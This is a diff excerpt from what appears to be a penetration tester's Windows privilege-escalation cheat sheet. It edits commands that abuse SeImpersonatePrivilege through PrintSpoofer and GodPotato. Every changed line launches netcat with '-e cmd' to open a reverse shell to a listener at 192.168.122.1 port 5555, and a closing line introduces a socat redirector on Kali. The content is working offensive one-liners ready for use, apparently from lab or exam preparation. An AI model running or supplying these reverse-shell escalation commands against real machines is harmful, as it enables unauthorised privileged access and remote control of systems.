@@ -317,8 +317,8 @@ $task.Principal | Format-List *
 Must try many times - sometimes shell dont work, exploit dont work etc
 ```
 🔺 SeImpersonatePrivilege
-./PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
-./GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
+./PrintSpoofer64.exe -c "nc64.exe 192.168.122.1 5555 -e cmd"
+./GodPotato-NET4.exe -cmd "nc64.exe 192.168.122.1 5555 -e cmd"
 
 🔺 SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege
 # Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
